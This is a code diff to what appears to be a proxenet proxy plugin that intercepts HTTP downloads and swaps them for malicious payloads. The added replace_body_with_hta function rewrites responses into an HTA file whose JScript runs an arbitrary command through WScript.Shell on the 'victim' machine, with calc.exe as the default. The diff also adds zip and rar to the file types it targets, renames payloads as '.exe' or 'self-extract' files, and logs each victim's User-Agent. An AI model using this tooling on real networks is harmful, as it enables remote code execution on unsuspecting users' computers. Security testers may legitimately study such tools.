@@ -46,6 +46,8 @@ types = {"docx": "application/vnd.openxmlformats-officedocument.wordprocessingml
          "pdf": "application/pdf",
          "swf": "application/x-shockwave-flash",
          "exe": "application/x-msdos-program",
+         "zip": "application/zip",
+         "rar": "application/rar",
          "html": "text/html",
          }
 
@@ -72,6 +74,58 @@ def hit_cache(ctype):
         return False
 
     return res
+
+
+def get_filename(http, ctype):
+    """
+    Tries to get the right filename (if captured)
+    """
+    global q
+
+    if http.rid in q.keys():
+        fname = q[http.rid]["name"]
+        return fname
+
+    if ctype in ("zip", "rar"):
+        fname = "self-extract.{}".format(ctype)
+    else:
+        fname = "attachement.{}".format(ctype)
+
+    return fname
+
+
+def get_ua(http):
+    """
+    Tries to get the victim User-Agent (if captured)
+    """
+    global q
+
+    return q[http.rid]["ua"] if http.rid in q.keys() else ""
+
+
+def replace_body_with_hta(http, ctype, **kwargs):
+    """
+    Injecting HTA test: this will inject an HTA file as the result page, which will run
+    an action specified as argument (default will be to spawn a calc.exe on the victim)
+    """
+
+    action = kwargs.get("action", "cmd.exe /c calc.exe")
+    fname = get_filename(http, ctype)
+    http.body = """<html><head>
+    <hta:application id="Service Interrupts" showintaskbar="no" sysmenu="no" border="none" </head>
+    <body><script language="JScript">
+    function Window_onLoad(){{ new ActiveXObject('WScript.Shell').Run('{}'); window.resizeTo(1,1); }}
+    window.onload=Window_onLoad; </script></body></html>""".format(action)
+
+    # changing content-type
+    http.del_header("Content-Type")
+    http.add_header("Content-Type", "text/hta")
+
+    # changing content-disposition
+    http.del_header("Content-Disposition")
+    http.add_header("Content-Disposition", "attachment; filename={}.hta".format(fname))
+
+    return http.render()
 
 
 def replace_with_malicious(http, ctype):
@@ -101,6 +155,7 @@ def replace_with_malicious(http, ctype):
                 res = res.strip()
 
             file_cache[ctype] = res
+            print("New payload generated for type '%s' : %s" % (ctype, res))
 
         except Exception as e:
             print("Payload generation failed for '%s': %s" % (ctype, e))
@@ -111,31 +166,9 @@ def replace_with_malicious(http, ctype):
         data = f.read()
         http.body = data
 
-    if http.rid in q.keys():
-        fname = q[http.rid]
-        del q[http.rid]
-    else:
-        fname = "attachement.{}".format(ctype)
-
+    fname = get_filename(http, ctype)
     http.del_header("Content-Disposition")
     http.add_header("Content-Disposition", "inline; filename={}.exe".format(fname))
-
-    # injecting hta test
-    # http.body = """<html><head>
-    # <hta:application id="Service Interrupts" showintaskbar="no" sysmenu="no" border="none" </head>
-    # <body><script language="JScript">
-    # function Window_onLoad(){
-	# new ActiveXObject('WScript.Shell').Run('cmd.exe /c calc.exe'); window.resizeTo(1,1);
-    # }
-    # window.onload=Window_onLoad; </script></body></html>"""
-
-    # changing content-type
-    # http.del_header("Content-Type")
-    # http.add_header("Content-Type", "text/hta")
-
-    # changing content-disposition
-    # http.del_header("Content-Disposition")
-    # http.add_header("Content-Disposition", "inline; filename={}.hta".format(fname))
 
     # 3.
     return True
@@ -179,7 +212,8 @@ def proxenet_request_hook(rid, request, uri):
     """
     global q
 
-    q[rid] = HTTPRequest(request, rid=rid).basename
+    h = HTTPRequest(request, rid=rid)
+    q[rid] = {"name": h.basename, "ua": h.get_header("user-agent")}
     return request
 
 
@@ -199,6 +233,9 @@ def proxenet_response_hook(rid, response, uri):
         if detected_type is None:
             del(http)
             return response
+
+        # for tests
+        # return replace_body_with_hta(http, detected_type)
 
         if detected_type == "html":
             res = inject_html(http)
